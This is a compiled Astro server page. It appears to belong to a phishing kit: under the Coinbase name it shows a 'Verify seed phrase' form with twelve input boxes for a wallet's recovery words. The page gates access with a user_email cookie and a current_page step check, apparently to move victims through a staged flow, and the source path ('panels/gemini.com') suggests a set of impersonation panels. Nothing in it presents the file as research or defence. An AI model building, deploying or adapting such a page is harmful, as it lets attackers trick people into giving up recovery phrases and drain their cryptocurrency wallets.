import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../chunks/AuthLayout_CigA1UqO.mjs';
import { $ as $$AuthCard } from '../chunks/AuthCard_DF9IDRFk.mjs';
import { i as initializeDb, g as getUserByEmail } from '../chunks/db__92qgssi.mjs';
/* empty css                                */
export { renderers } from '../renderers.mjs';

const $$Astro = createAstro();
const $$Seed = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Seed;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  if (!userEmail) {
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  if (!user) {
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "seed") {
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "Seed Phrase Verification", "data-astro-cid-dspemq7p": true }, { "default": async ($$result2) => renderTemplate` ${renderComponent($$result2, "AuthCard", $$AuthCard, { "data-astro-cid-dspemq7p": true }, { "default": async ($$result3) => renderTemplate` ${maybeRenderHead()}<div class="coinbase-card" data-astro-cid-dspemq7p> <div class="coinbase-logo" data-astro-cid-dspemq7p>coinbase</div> <h2 class="coinbase-heading" data-astro-cid-dspemq7p>Verify seed phrase</h2> <p class="coinbase-subtext" data-astro-cid-dspemq7p>
Enter your 12-word seed phrase to verify your wallet
</p> <form class="coinbase-verification-form" data-astro-cid-dspemq7p> <div class="coinbase-seed-inputs" data-astro-cid-dspemq7p> <div class="seed-row" data-astro-cid-dspemq7p> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>1</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>2</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>3</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>4</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>5</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>6</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> </div> <div class="seed-row" data-astro-cid-dspemq7p> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>7</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>8</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>9</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>10</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>11</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> <div class="seed-input-wrapper" data-astro-cid-dspemq7p> <span class="seed-number" data-astro-cid-dspemq7p>12</span> <input type="text" class="seed-box" required data-astro-cid-dspemq7p> </div> </div> </div> <button type="submit" class="coinbase-continue-btn" data-astro-cid-dspemq7p>Continue</button> </form> </div> ` })} ` })}   `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/seed.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/seed.astro";
const $$url = "/seed";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Seed,
  file: $$file,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
